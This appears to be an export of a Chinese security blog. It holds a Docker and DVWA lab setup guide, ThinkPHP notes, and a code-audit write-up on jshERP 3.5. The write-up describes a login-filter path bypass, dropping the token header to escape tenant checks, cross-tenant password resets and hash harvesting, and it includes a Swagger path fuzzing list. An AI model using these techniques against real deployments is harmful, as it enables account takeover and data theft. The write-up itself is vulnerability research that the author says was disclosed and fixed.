b6b3df3365d6d33038ca5a9a64087dfc21ef8d4e7d030d009ea5dbf3f4353b9465652c832a7a7469dffdbc3543272ff33a2c04b42071564aa1aaf6eb0c86c18b05cc1d91d99065960c3f887675159abe24ac2b633b6484c71e75a578c0ae44933d52716643a9149039eaeb54f96e7654e3d35269a3caa875cf4540ffb24b9ef9840697ccf67b92521d4ec3778a8d2c982ea6d90f2a6932a138c25c7ce4c8b91c98b6963324da4dcb1f8174f6e36d9848ba6a406787276545657cac23b6c52f0d93a79dd22f7024c680a5e43e3bc8b4318469d3d500900a99cd62468eb56f62e2ccb3d8411f4b96f4b0d025fcb66ae613966378b52c64c10eff6be506f6d8891731cde5a28c7247d05108fba901d98efa20cfb2ec2c034d73f7091a21b74c1dc1a5c5061b44fb21114d71716591eb7173217e032de1efa2b2d28448471bb157c102f04c65fae35b8560293e89c723fad3d1e4042b9dd46fd21cbd4430db8fdab148fefd6b72b1ac1d516d0fc2548aa6b440e69afd8bd84055e53a938b0b23e28f188f320c236cb127a28ae877a3cae421d16e61a33c53ccdee719901ec7d862abb86f556f183437a154d915cee79cf431eefca7d91fedc5419a397e2d1c7fb0592e0a122e438f9723e37c1f8048031813f4005199ba44f04ce1514327879bec255e110abf4b07dab1b25b5d64e9348e5e89f700dc4e80121c6580a559afdf6037a68b2bebba8666256106559c6396a1d4de66d4ca757cc754af8865d0bfb15eba68ae14c4c00bd2d4775af03b64eb6b918825db81f8aa2cfe8bbe09f73921fe755049b41d9c7965b9cccf40c6fc6f25082d2095bcb218a39100b0b6f25912aee28db5e4a46ff41c7b0c181e65507b9367be019e8b7b70cb59c50a7305cefa5e1fb8c0e46348aafa2b7f86a20efd71d9128f055aba7f9958c011285cdcb1a74565e761ce6c94ef5ae22573f0f63bf482daf16467cca50f30b722c5ea21415406ea5d73810d75701f82bce1529c6e6915f0a756ccd8fafbc9aa071ee5d6bfa0e7f89afdf3211a804d75318aca7dcf2f82da04fbfa45e126f4ab75d02bd2d1449499bee33ac10b0037173522f8de2706c7058e11e076ad7bd4e9ff33ad38d0b6543379ff4ef164ca9fa178becfb4dbc12e5c25af40eddd0f7ae16decee253a2e4a99
  
    
      
      
        请输入密码
      
    
  

]]></content>
  </entry>
  <entry>
    <title>云服务器部署Docker及搭建各类环境</title>
    <url>/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[参考资料最详细的ubuntu 安装 docker教程：https://zhuanlan.zhihu.com/p/651148141?utm_id=0
docker搭建Dvwa靶场：https://juejin.cn/post/7076807703565336612

开始的开始让我们先更新一下apt
sudo apt-get updatesudo apt-get upgrade

部署Docker一. 卸载Ubuntu自带的Docker以下操作最好用管理员

注：docker的旧版本不一定被称为docker，http://docker.io 或 docker-engine也有可能，所以我们卸载的命令为：

apt-get remove docker docker-engine docker.io containerd runc

如果报错也正常，有些Ubuntu没有Docker，直接下一步
二.安装1.安装docker依赖
Docker在Ubuntu上依赖一些软件包。执行以下命令来安装这些依赖:
apt-get install ca-certificates curl gnupg lsb-release

2.添加Docker官方GPG密钥
执行以下命令来添加Docker官方的GPG密钥:
curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -

3.添加Docker软件源
执行以下命令来添加Docker的软件源:
sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;

4.安装docker
执行以下命令来安装Docker:
apt-get install docker-ce docker-ce-cli containerd.io

5.配置用户组（可选）
默认情况下，只有root用户和docker组的用户才能运行Docker命令。我们可以将当前用户添加到docker组，以避免每次使用Docker时都需要使用sudo。命令如下：
sudo usermod -aG docker $USER

注：重新登录才能使更改生效。

接下来我们就可以测试一下看Docker有没有安装成功了
我们可以通过启动docker来验证我们是否成功安装。命令如下：
systemctl start docker

安装工具
apt-get -y install apt-transport-https ca-certificates curl software-properties-common

重启docker
service docker restart

验证是否成功
sudo docker run hello-world

因为我们之前没有拉取过hello-world，所以运行命令后会出现本地没有该镜像，并且会自动拉取的操作
查看镜像（image）
docker images

出现了hello-world的镜像即可
查看版本
我们可以通过下面的命令来查看docker的版本
sudo docker version

搭建DVWA靶场一. 准备工作开端口：
打开控制台，安全组的管理规则开一个端口，假设为1314。然后连上服务器（我使用xshell）
启动Docker：
systemctl start docker

二.拉取image找image（镜像）
docker search dvwa

选一个image拉取：
docker pull citizenstig/dvwa

三. 布置容器docker images  //查看镜像docker run --name Dvwa -d -p 9320:80  citizenstig/dvwa  //布置容器-p：指定映射端口-d：后台运行--name：容器命名为XXX

我端口是9320，后面的80不能改，容器里的php服务默认跑在80端口。
四. 后续在网页上打开，创建数据库，账户密码输入admin，password即可。
删除容器和镜像先删除正在运行的容器查看正在运行的容器：
docker ps

停止正在运行的容器：
docker stop &lt;容器ID或名称&gt;

删除目标容器：
docker rm  &lt;容器ID或名称&gt;

再删除目标镜像查看镜像：
docker images

删除镜像：
docker rmi IMAGE_ID

搭建CTF题目环境一. 上传项目到服务器个人使用WinSCP，优点是可视化比较好。自己mkdir一个目录储存项目即可。
二. 构建Docker镜像在 Dockerfile 所在目录下，打开终端或命令提示符，执行以下命令来构建 Docker 镜像：
docker build -t your-app-name .


这里的 your-app-name 是你给你的 Docker 镜像起的名字，. 指的是当前目录，即 Dockerfile 所在的目录。

]]></content>
      <categories>
        <category>服务器</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-jshERP-3.5</title>
    <url>/2025/08/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-jshERP-3-5/</url>
    <content><![CDATA[前言前面跟着网上的文章审计过jshERP-2.3，所以现在打算自己动手审一下3.5版本的，最后收获还是不错的(doge
我自己这次采用的还是半黑盒加半白盒的手法，基本上就是根据自己要测的功能点找到对应的代码文件进行分析
项目源码下载链接：Release 管伊佳ERP_v3.5 · jishenghua&#x2F;jshERP · GitHub
环境搭建该版本的环境搭建没有前面的那么简单，最开始还是将配置文件中的mysql和redis配置信息改成自己的数据，然后再将sql文件导入一下

3.5版本的jshERP项目变成了前后端分离的项目，后端比较好启动，启动完后日志里面会给你一条启动前端项目的命令

这个时候我就遇到了点问题，执行npm run serve会遇到一系列的报错，主要还是依赖冲突的问题
项目需要 vue-loader@^15.7.0（要求 webpack 5.x），但项目中已安装的 @vue/cli-plugin-babel 等依赖要求 webpack@^4.0.0，冲突的 peer 依赖导致 npm 安装失败
解决方案：

在 package.json 中添加 resolutions 字段强制指定 webpack 版本：

&quot;resolutions&quot;: &#123;  &quot;webpack&quot;: &quot;^4.47.0&quot;&#125;


然后运行：

npm install --force

css-loader 或 style-loader 版本过高，与 Webpack 4 不兼容
解决方案：将版本降低到webpack 4可以兼容
npm install --save-dev css-loader@3.6.0 style-loader@1.3.0# 如果使用 Sassnpm install --save-dev sass-loader@8.0.2 node-sass@4.14.1

都解决完了之后执行命令：npm run serve便可以成功将前端起起来了
审计开工一般鄙人审计的第一步都是先看pom.xml文件，看看有没有值得注意的地方
这里我们可以注意到数据库是mybatis，fastjson的版本为1.2.83，存在漏洞的版本，先记下来留着后面进行测试
而mybatis的未做预处理的话所用的危险字符便是$&#123;，所以我们全局搜索一下该符号以及，跟sql相关的xml文件中什么都没有，点进去后发现每一个sql语句都进行了预处理，是利用#&#123;&#125;进行处理的，不存在sql注入了，转移目标
审filterfilter文件中的doFilter方法逻辑还是挺清楚的，先检测下是否登录了，没有登录的话检测访问路由是否在allowUrls中，在的话就放过，要不然就强转到登录页面
public void doFilter(ServletRequest request, ServletResponse response,                     FilterChain chain) throws IOException, ServletException &#123;    HttpServletRequest servletRequest = (HttpServletRequest) request;    HttpServletResponse servletResponse = (HttpServletResponse) response;    String requestUrl = servletRequest.getRequestURI();    //具体，比如：处理若用户未登录，则跳转到登录页    Object userId = redisService.getObjectFromSessionByKey(servletRequest,&quot;userId&quot;);    if(userId!=null) &#123; //如果已登录，不阻止        chain.doFilter(request, response);        return;    &#125;    if (requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/doc.html&quot;) ||        requestUrl.contains(&quot;/user/login&quot;) || requestUrl.contains(&quot;/user/register&quot;))) &#123;        chain.doFilter(request, response);        return;    &#125;    if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) &#123;        for (String url : allowUrls) &#123;            if (requestUrl.startsWith(url)) &#123;                chain.doFilter(request, response);                return;            &#125;        &#125;    &#125;    servletResponse.setStatus(500);    if(requestUrl != null &amp;&amp; !requestUrl.contains(&quot;/user/logout&quot;) &amp;&amp; !requestUrl.contains(&quot;/function/findMenuByPNumber&quot;)) &#123;        servletResponse.getWriter().write(&quot;loginOut&quot;);    &#125;&#125;

同时该filter是对根目录下的所有路径都会进行一个检测，filterPath的值便是上面allowUrls的值，以＃分割
@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,        initParams = &#123;@WebInitParam(name = &quot;filterPath&quot;,                      value = &quot;/jshERP-boot/user/login#/jshERP-boot/user/weixinLogin#/jshERP-boot/user/weixinBind#&quot; +                              &quot;/jshERP-boot/user/registerUser#/jshERP-boot/user/randomImage#&quot; +                              &quot;/jshERP-boot/platformConfig/getPlatform#/jshERP-boot/v2/api-docs#/jshERP-boot/webjars#&quot; +                              &quot;/jshERP-boot/systemConfig/static#/jshERP-boot/api/plugin/wechat/weChat/share#&quot; +                              &quot;/jshERP-boot/api/plugin/general-ledger/pdf/voucher&quot;)&#125;)

由于前面那个springmvc项目有审到interceptor，所以一开始以为通过/jshERP-boot/user/login/../../xx的方式在filter检测的时候会和经过springmvc的interceptor检测的时候一样先自动规范路径为/jshERP-boot/xx，这样就绕过不了了
后面实际测得时候发现filter检测得url路径还是原本的/jshERP-boot/user/login/../../xx（总的来说还是filter和interceptor在什么时候起作用还是没分清楚
那样子的话就很好绕过了，因为doFilter方法中检测路径用的是contains函数，所以我们只要输入的路径中有包含allowUrls中的路径便可以实现绕过登录了（这在后面又妙用）
审config该项目的config目录下都是一些配置文件，重点关注TenantConfig文件
tenantSqlParser.setTenantHandler(new TenantHandler() &#123;    @Override    public Expression getTenantId() &#123;        String token = request.getHeader(&quot;X-Access-Token&quot;);        Long tenantId = Tools.getTenantIdByToken(token);        if (tenantId != 0L) &#123;            return new LongValue(tenantId); // 返回租户ID        &#125; else &#123;            return null; // 超管不添加租户条件        &#125;    &#125;    @Override    public String getTenantIdColumn() &#123;        return &quot;tenant_id&quot;; // 数据库中的租户ID列名    &#125;    @Override    public boolean doTableFilter(String tableName) &#123;        // 系统表不添加租户条件        if (&quot;jsh_material_property&quot;.equals(tableName) ||             &quot;jsh_sequence&quot;.equals(tableName) ||            &quot;jsh_function&quot;.equals(tableName) ||            &quot;jsh_platform_config&quot;.equals(tableName) ||            &quot;jsh_tenant&quot;.equals(tableName)) &#123;            return true; // 跳过租户过滤        &#125;        return false; // 需要添加租户条件    &#125;&#125;);


租户ID获取逻辑：
从请求头 X-Access-Token 中解析租户ID
租户ID为 0 时表示超级管理员（不添加租户过滤条件）
其他租户自动添加 tenant_id = &#123;租户ID&#125; 条件


表过滤规则：
系统表（如 jsh_tenant, jsh_function）不添加租户条件
业务表（如用户表、订单表）自动添加租户条件



SQL 解析器配置
租户SQL解析器
List&lt;ISqlParser&gt; sqlParserList = new ArrayList&lt;&gt;();TenantSqlParser tenantSqlParser = new TenantSqlParser();sqlParserList.add(tenantSqlParser);paginationInterceptor.setSqlParserList(sqlParserList);

将租户解析器加入分页插件，实现 自动改写SQL
自定义SQL过滤器
paginationInterceptor.setSqlParserFilter(metaObject -&gt; &#123;    MappedStatement ms = SqlParserHelper.getMappedStatement(metaObject);    // 指定方法跳过租户过滤    return switch (ms.getId()) &#123;        case &quot;com.jsh.erp.datasource.mappers.UserMapperEx.getUserByWeixinOpenId&quot;,             &quot;com.jsh.erp.datasource.mappers.UserMapperEx.updateUserWithWeixinOpenId&quot;,             &quot;com.jsh.erp.datasource.mappers.UserMapperEx.getUserListByUserNameOrLoginName&quot;,             &quot;com.jsh.erp.datasource.mappers.UserMapperEx.disableUserByLimit&quot;,             &quot;com.jsh.erp.datasource.mappers.RoleMapperEx.getRoleWithoutTenant&quot;,             &quot;com.jsh.erp.datasource.mappers.LogMapperEx.insertLogWithUserId&quot;,             &quot;com.jsh.erp.datasource.mappers.UserBusinessMapperEx.getBasicDataByKeyIdAndType&quot; -&gt; true;        default -&gt; false;    &#125;;&#125;);


特殊方法跳过租户过滤：
微信登录&#x2F;绑定相关方法（如 getUserByWeixinOpenId）
系统管理方法（如 disableUserByLimit）
日志记录（insertLogWithUserId）
基础数据获取（getBasicDataByKeyIdAndType）



Mapper 扫描配置
@Beanpublic MapperScannerConfigurer mapperScannerConfigurer() &#123;    MapperScannerConfigurer scannerConfigurer = new MapperScannerConfigurer();    scannerConfigurer.setBasePackage(&quot;com.jsh.erp.datasource.mappers*&quot;);    return scannerConfigurer;&#125;


扫描指定包下的 MyBatis Mapper 接口
相当于 @MapperScan(&quot;com.jsh.erp.datasource.mappers*&quot;)

简单的来说就是除了几个特定的表外，剩下的表在进行增删改查的时候都会自动根据报头中的X-Access-Token值来进行条件添加（刚看完的时候还没有意识到问题的严重性
越权开始对项目的各个功能点进行测试，由于是要挖洞，所以肯定先从一旦有洞然后造成危害会比较大的功能点开始测试，这里我先从系统管理的角色管理页面进行测试，顺藤摸瓜开审com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;UserController.java
resetPwd方法一开始便吸引了我的眼球
@PostMapping(value = &quot;/resetPwd&quot;)@ApiOperation(value = &quot;重置密码&quot;)public String resetPwd(@RequestBody JSONObject jsonObject,                                 HttpServletRequest request) throws Exception &#123;    Map&lt;String, Object&gt; objectMap = new HashMap&lt;&gt;();    Long id = jsonObject.getLong(&quot;id&quot;);    String password = &quot;123456&quot;;    String md5Pwd = Tools.md5Encryp(password);    int update = userService.resetPwd(md5Pwd, id);    if(update &gt; 0) &#123;        return returnJson(objectMap, SUCCESS, ErpInfo.OK.code);    &#125; else &#123;        return returnJson(objectMap, ERROR, ErpInfo.ERROR.code);    &#125;&#125;

继续往上找resetPwd方法，做了个限制不能够重置超管密码

往上找updateByPrimaryKeySelective方法，走到xml文件里面后发现该mybatis语句仅通过传入的id值进行判断，整个代码逻辑到mybatis语句的过程中都没有对是谁删除的进行一个判断，毫无疑问这就是一个纯纯的水平越权漏洞

失败话不多说开始测试，我们先拦截一个重置密码的请求包，看到了是通过json传递id参数

修改id为133（那个账号是我自己提前注册的），查看返回包

？？？，重置失败了，不信邪的我开启了调试，可就是找不到原因在哪里，直到我发现了日志里面会记录调用的具体sql语句和参数值
终于发现了真相
2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - ==&gt;  Preparing: SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE jsh_user.tenant_id = 63 AND id = ? 2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - ==&gt; Parameters: 133(Long)2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - &lt;==      Total: 02025/08/06-20:04:44 ERROR [http-nio-9999-exec-9] com.jsh.erp.exception.GlobalExceptionHandler - Global Exception Occured =&gt; url : http://localhost:9999/jshERP-boot/user/resetPwd, msg : null

在执行重置密码的sql语句之前先进行了一次查找操作，看是否能够找到要修改的数据
SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE jsh_user.tenant_id = 63 AND id = ?

哇哦，where子句里面怎么自己多了一个条件jsh_user.tenant_id &#x3D; 63，明明通过json传参过去的参数只有一个id
然后突然想到了前面看到的TenantConfig类代码，自动进行条件的添加。。。。。
原来预防水平越权的操作在这里等着我，那么这样的思路就走不通了
柳暗花明又一村不死心的我返回反复观摩TenantConfig代码，以及看日志里面的sql语句（然后滚去吃了个饭doge
吃完回来突然脑子灵光一闪，TenantConfig里面自动添加的条件是在X-Access-Token标头的数据处获取的
X-Access-Token: a60964b01528475ab2e38e863c025be7_63从这里拿到了63这个数据，那是不是可以代表我把该标头的数据修改为X-Access-Token: a60964b01528475ab2e38e863c025be7_133的话，拿到的数据就是133
话不多说，赶紧尝试

loginout，就是代表未登录，干脆利落的失败了，没我想的那么简单
无妨，脑子又灵光一闪，后端从X-Access-Token标头获取数据，那么我只要把这个标头给删了数据不就获取不到了嘛，把X-Access-Token删去也就意味着我们处于未登录的状态，那么我们就需要绕过filter的检测，上面有讲过如何绕过，这两一配合不就可以完美解决这个问题了
尝试尝试

芜湖，成功成功，瞅一眼日志
2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - ==&gt;  Preparing: SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE id = ? 2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - ==&gt; Parameters: 132(Long)2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - &lt;==      Total: 12025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - ==&gt;  Preparing: UPDATE jsh_user SET password = ? WHERE id = ? 2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - ==&gt; Parameters: e10adc3949ba59abbe56e057f20f883e(String), 132(Long)2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - &lt;==    Updates: 1

果然和上面推测的是一模一样的，查询语句SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE id = ? 中的where子句的条件只剩下了id，而没有tennant_id
那就很好了，以点破面，一处通处处通，接下来只要是对于数据库操作的语句写的不严谨那么便存在越权漏洞了
就拿com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;UserController.java文件中就有重置密码，删除用户等操作
大量的越权后面功能点一个个测试，发现了大量的越权
包括但不限于如下：
com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;SupplierController.java的batchSetStatus方法存在越权漏洞，可以任意控制所有供应商的状态

com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;ResourceController.java中的updateResource方法存在越权，并且传参中的tenantId可以随便改，改了之后对应的信息便会跟着修改并转移到传递的tenantId值的麾下，相当于也是实现了另类的删除功能
（该类下的delete方法也存在越权操作）
下面是对供应商的越权更新操作：


com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;RoleController.java中的allList方法未授权访问可以得到所有role数据，登录之后只能得到各自租户下的role数据

通过上面获取到所有role数据，配合该类中的batchSetStatus方法实现越权，可以任意控制所有role的状态


com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;ResourceController.java中的getList方法存在越权访问，并且通过该方法我们可以获取到不同租户经过md5加密后的密码，用自己的爆破脚本尝试爆破或者拿去专业平台解密都是可以的，得到明文密码之后便可以再次实现任意账号接管了

com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;PersonController.java中的getAllList方法存在越权执行，获取所有经手人信息（看了下该类下的所有方法都可以实现越权）

com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;AccountController.java中的getAccount方法存在未授权

and so on。。。。。。
文件上传后面在测试系统参数相关功能点的时候意外发现相对应的类中有一个文件上传的方法并未出现在页面上，即com&#x2F;jsh&#x2F;erp&#x2F;controller&#x2F;SystemConfigController.java的upload方法
@PostMapping(value = &quot;/upload&quot;)@ApiOperation(value = &quot;文件上传统一方法&quot;)public BaseResponseInfo upload(HttpServletRequest request, HttpServletResponse response) &#123;    BaseResponseInfo res = new BaseResponseInfo();    try &#123;        String savePath = &quot;&quot;;        String bizPath = request.getParameter(&quot;biz&quot;);        if (&quot;bill&quot;.equals(bizPath) || &quot;financial&quot;.equals(bizPath) || &quot;material&quot;.equals(bizPath)) &#123;            MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;            MultipartFile file = multipartRequest.getFile(&quot;file&quot;);// 获取上传文件对象            if(fileUploadType == 1) &#123;                savePath = systemConfigService.uploadLocal(file, bizPath, request);            &#125; else if(fileUploadType == 2) &#123;                savePath = systemConfigService.uploadAliOss(file, bizPath, request);            &#125;            if(StringUtil.isNotEmpty(savePath))&#123;                res.code = 200;                res.data = savePath;            &#125;else &#123;                res.code = 500;                res.data = &quot;上传失败！&quot;;            &#125;        &#125; else &#123;            res.code = 505;            res.data = &quot;文件分类错误！&quot;;        &#125;    &#125; catch (Exception e) &#123;        logger.error(e.getMessage(), e);        res.code = 500;        res.data = &quot;上传失败！&quot;;    &#125;    return res;&#125;

biz参数需要满足是bill或financial或material三个中的一个才可以走进if中
往下看我们可以知道文件存储的位置有两个，本地和阿里云，通过fileUploadType参数进行判断
而该参数的值默认等于1，于是上传的文件默认存储于本地

所以我们跟进uploadLocal方法

可以看到对于上传的文件是做了较为严格的限制，防止了路径穿越也限制了文件后缀
发现允许上传的文件后缀包含zip，但是似乎没有解压的相关代码，遂无
那只剩下一个pdf后缀可以利用了，上传一个pdf xss文件，打一个存储型xss（没啥用。。。。。。
Swagger泄露Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。总体目标是使客户端和文件系统作为服务器以同样的速度来更新。
spring项目中的配置参考：解决 Swagger API 未授权访问漏洞：完善分析与解决方案-阿里云开发者社区 (aliyun.com)
相关路径，在实际测试工程中可用以下字典fuzz
/api/api-docs/api-docs/swagger.json/api.html/api/api-docs/api/apidocs/api/doc/api/swagger/api/swagger-ui/api/swagger-ui.html/api/swagger-ui.html//api/swagger-ui.json/api/swagger.json/api/swagger//api/swagger/ui/api/swagger/ui//api/swaggerui/api/swaggerui//api/v1//api/v1/api-docs/api/v1/apidocs/api/v1/swagger/api/v1/swagger-ui/api/v1/swagger-ui.html/api/v1/swagger-ui.json/api/v1/swagger.json/api/v1/swagger//api/v2/api/v2/api-docs/api/v2/apidocs/api/v2/swagger/api/v2/swagger-ui/api/v2/swagger-ui.html/api/v2/swagger-ui.json/api/v2/swagger.json/api/v2/swagger//api/v3/apidocs/apidocs/swagger.json/doc.html/docs//druid/index.html/graphql/libs/swaggerui/libs/swaggerui//spring-security-oauth-resource/swagger-ui.html/spring-security-rest/api/swagger-ui.html/sw/swagger-ui.html/swagger/swagger-resources/swagger-resources/configuration/security/swagger-resources/configuration/security//swagger-resources/configuration/ui/swagger-resources/configuration/ui//swagger-ui/swagger-ui.html/swagger-ui.html#/api-memory-controller/swagger-ui.html//swagger-ui.json/swagger-ui/swagger.json/swagger.json/swagger.yml/swagger//swagger/index.html/swagger/static/index.html/swagger/swagger-ui.html/swagger/ui//Swagger/ui/index/swagger/ui/index/swagger/v1/swagger.json/swagger/v2/swagger.json/template/swagger-ui.html/user/swagger-ui.html/user/swagger-ui.html//v1.x/swagger-ui.html/v1/api-docs/v1/swagger.json/v2/api-docs/v3/api-docs

现在看一手关于它的配置文件Swagger2Config.java
@Configuration@EnableSwagger2public class Swagger2Config &#123;    @Bean    public Docket createRestApi() &#123;        return new Docket(DocumentationType.SWAGGER_2)                .apiInfo(this.apiInfo())                .select()                .apis(RequestHandlerSelectors.any())                .paths(PathSelectors.any())                .build();    &#125;    private ApiInfo apiInfo() &#123;        return new ApiInfoBuilder()                .title(&quot;管伊佳ERP Restful Api&quot;)                .description(&quot;管伊佳ERP接口描述&quot;)                .termsOfServiceUrl(&quot;http://127.0.0.1&quot;)                .contact(new Contact(&quot;jishenghua&quot;, &quot;&quot;, &quot;&quot;))                .version(&quot;3.0&quot;)                .build();    &#125;&#125;

在该类及配置文件中未进行任何的限制及访问控制和身份验证，因此导致在未登录的情况下能够请求得到api接口
声明
法律与道德声明  

本文所述漏洞信息仅供技术研究与防御参考
任何个人&#x2F;组织不得将漏洞用于非法目的，包括但不限于：未授权渗透、数据窃取、系统破坏  
作者强烈谴责恶意利用行为，对因滥用本文信息导致的损失不承担任何法律责任


本文所涉及到的较为严重的洞项目开发者已做修复，发文也已取得开发者同意

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>thinkphp学习</title>
    <url>/2024/07/14/thinkphp%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[引用thinkPHP8.0安装与避坑
ThinPHP官方手册
安装thinphp8.0&lt;!--1、访问网址下载安装composer--&gt;https://getcomposer.org/Composer-Setup.exe&lt;!--2、配置镜像源防止乱七八糟的网络和GitHub仓库拉取无权限问题--&gt;composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/&lt;!--3、在网站根目录(www)下进入cmd创建项目--&gt;composer create-project topthink/think tpcd tp&lt;!--4、解决依赖项报错--&gt;composer up --ignore-platform-reqs&lt;!--5、运行命令查看效果--&gt;php think run&lt;!--6、访问查看结果，这里有坑：不能直接访问0.0.0.0:8000这个地址--&gt;127.0.0.1:8000

在第三步创建tk项目时候有报错是正常的，因为有依赖项无法安装的问题(我安装时候的PHP解释器版本是8.2.9)，所以需要切换到tk项目目录下执行命令解决依赖项无法安装的问题
基础目录结构单应用模式默认安装后的目录结构就是单应用目录结构
www  WEB部署目录（或者子目录）├─app           应用目录│  ├─controller      控制器目录│  ├─model           模型目录│  ├─ ...            更多类库目录│  ││  ├─common.php         公共函数文件│  └─event.php          事件定义文件│├─config                配置目录│  ├─app.php            应用配置│  ├─cache.php          缓存配置│  ├─console.php        控制台配置│  ├─cookie.php         Cookie配置│  ├─database.php       数据库配置│  ├─filesystem.php     文件磁盘配置│  ├─lang.php           多语言配置│  ├─log.php            日志配置│  ├─middleware.php     中间件配置│  ├─route.php          URL和路由配置│  ├─session.php        Session配置│  ├─trace.php          Trace配置│  └─view.php           视图配置│├─view            视图目录├─route                 路由定义目录│  ├─route.php          路由定义文件│  └─ ...   │├─public                WEB目录（对外访问目录）│  ├─index.php          入口文件│  ├─router.php         快速测试文件│  └─.htaccess          用于apache的重写│├─extend                扩展类库目录├─runtime               应用的运行时目录（可写，可定制）├─vendor                Composer类库目录├─.example.env          环境变量示例文件├─composer.json         composer 定义文件├─LICENSE.txt           授权说明文件├─README.md             README 文件├─think                 命令行入口文件

多应用模式详见官方手册
默认应用文件默认安装后，app目录下会包含下面的文件。
├─app           应用目录│  ││  ├─BaseController.php    默认基础控制器类│  ├─ExceptionHandle.php   应用异常定义文件│  ├─common.php            全局公共函数文件│  ├─middleware.php        全局中间件定义文件│  ├─provider.php          服务提供定义文件│  ├─Request.php           应用请求对象│  └─event.php             全局事件定义文件

BaseController.php、Request.php 和ExceptionHandle.php三个文件是系统默认提供的基础文件，位置你可以随意移动，但注意要同步调整类的命名空间。如果你不需要使用Request.php 和ExceptionHandle.php文件，或者要调整类名，记得必须同步调整provider.php文件中的容器对象绑定。
配置
默认情况下，程序出错会显示：页面出错！请稍候再试~
这种情况，一般是应用部署好后，万一出错给用户看的；
如果我们自己在开发阶段，需要开启调试模式，来提示具体的错误信息：
在根目录有一个文件：.example.env，改成 .env ，也就是去掉点前面；（环境变量文件）
然后在配置信息的第一行：APP_DEBUG &#x3D; true 即可，false则不开启。



开启后会如下所示：


调试模式开启后，可以发现右下角会出现trace调试工具小图标：
包含了丰富的调试内容：具体自点查看。



架构HTTP请求流程对于一个HTTP应用来说，从用户发起请求到响应输出结束，大致的标准请求流程如下：

载入Composer的自动加载autoload文件
实例化系统应用基础类think\App
获取应用目录等相关路径信息
加载全局的服务提供provider.php文件
设置容器实例及应用对象实例，确保当前容器对象唯一
从容器中获取HTTP应用类think\Http
执行HTTP应用类的run方法启动一个HTTP应用
获取当前请求对象实例（默认为 app\Request 继承think\Request）保存到容器
执行think\App类的初始化方法initialize
加载环境变量文件.env和全局初始化文件
加载全局公共文件、系统助手函数、全局配置文件、全局事件定义和全局服务定义
判断应用模式（调试或者部署模式）
监听AppInit事件
注册异常处理
服务注册
启动注册的服务
加载全局中间件定义
监听HttpRun事件
执行全局中间件
执行路由调度（Route类dispatch方法）
如果开启路由则检查路由缓存
加载路由定义
监听RouteLoaded事件
如果开启注解路由则检测注解路由
路由检测（中间流程很复杂 略）
路由调度对象think\route\Dispatch初始化
设置当前请求的控制器和操作名
注册路由中间件
绑定数据模型
设置路由额外参数
执行数据自动验证
执行路由调度子类的exec方法返回响应think\Response对象
获取当前请求的控制器对象实例
利用反射机制注册控制器中间件
执行控制器方法以及前后置中间件
执行当前响应对象的send方法输出
执行HTTP应用对象的end方法善后
监听HttpEnd事件
执行中间件的end回调
写入当前请求的日志信息

入口文件ThinkPHP8.0采用单一入口模式进行项目部署和访问，一个应用都有一个统一（但不一定是唯一）的入口。如果采用自动多应用部署的话，一个入口文件还可以自动对应多个应用。
应用入口文件默认的应用入口文件位于public/index.php，如果你没有特殊的自定义需求，无需对入口文件做任何的更改。入口文件位置的设计是为了让应用部署更安全，请尽量遵循public目录为唯一的web可访问目录，其他的文件都可以放到非WEB访问目录下面
